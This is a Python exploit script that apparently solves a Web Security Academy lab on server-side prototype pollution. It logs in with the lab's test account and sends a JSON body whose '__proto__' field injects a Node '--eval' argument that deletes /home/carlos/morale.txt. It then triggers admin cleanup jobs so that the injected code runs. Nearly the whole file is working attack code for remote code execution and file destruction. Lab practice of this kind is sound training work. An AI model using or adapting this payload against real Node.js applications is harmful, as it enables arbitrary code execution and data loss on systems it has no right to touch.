import http.client
import json
import re
import ssl

LAB_ID = "???"


def GET_login() -> http.client.HTTPResponse:
    method, path = 'GET', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, ''.encode('utf-8'), headers)
    return connection.getresponse()


def POST_login(
        session: str,
        csrf: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/json;charset=UTF-8',
        'cookie': f'session={session}',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'referer': f'https://{LAB_ID}.web-security-academy.net/login',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    fields = {
        'csrf': csrf,
        'username': 'wiener',
        'password': 'peter',
    }
    body = json.dumps(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def POST_myaccount_changeaddress(
        session: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/my-account/change-address'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/json;charset=UTF-8',
        'cookie': f'session={session}',
    }
    fields = {
        "address_line_1": "Wiener HQ",
        "address_line_2": "One Wiener Way",
        "city": "Peterville",
        "postcode": "BU1 1RP",
        "country": "UK",
        "sessionId": session,
        "__proto__": {
            "execArgv": [
                "--eval=require('fs').unlinkSync('/home/carlos/morale.txt')"
            ],
        }
    }
    body = json.dumps(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def GET_admin(
        session: str,
) -> http.client.HTTPResponse:
    method, path = 'GET', '/admin'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'cookie': f'session={session}',
    }
    body = ''
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def POST_admin_jobs(
        session: str,
        csrf: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/admin/jobs'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/json;charset=UTF-8',
        'cookie': f'session={session}',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'priority': 'u=0',
        'te': 'trailers',
    }
    fields = {
        "csrf": csrf,
        "sessionId": session,
        "tasks": [
            "db-cleanup",
            "fs-cleanup",
        ],
    }
    body = json.dumps(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def login_csrf() -> tuple[str, str]:
    response = GET_login()
    cookie_header = response.getheader('set-cookie')
    session = re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]
    csrf = re.findall(r'name="csrf" value="([a-zA-Z0-9]+)"', response.read().decode('utf-8'))[0]
    return session, csrf


def login_session():
    session, csrf = login_csrf()
    response = POST_login(session, csrf)
    cookie_header = response.getheader('set-cookie')
    return re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]


def admin_csrf(session: str) -> str:
    response = GET_admin(session)
    csrf = re.findall(r'name="csrf" value="([a-zA-Z0-9]+)"', response.read().decode('utf-8'))[0]
    return csrf


session = login_session()
response = POST_myaccount_changeaddress(session)
print(f"response status: {response.status}")
for name, header in response.headers.items():
    print(f"{name}: {header}")
print(response.read().decode())
print()
csrf = admin_csrf(session)
response = POST_admin_jobs(session, csrf)
print(f"response status: {response.status}")
for name, header in response.headers.items():
    print(f"{name}: {header}")
print(response.read().decode())
print()
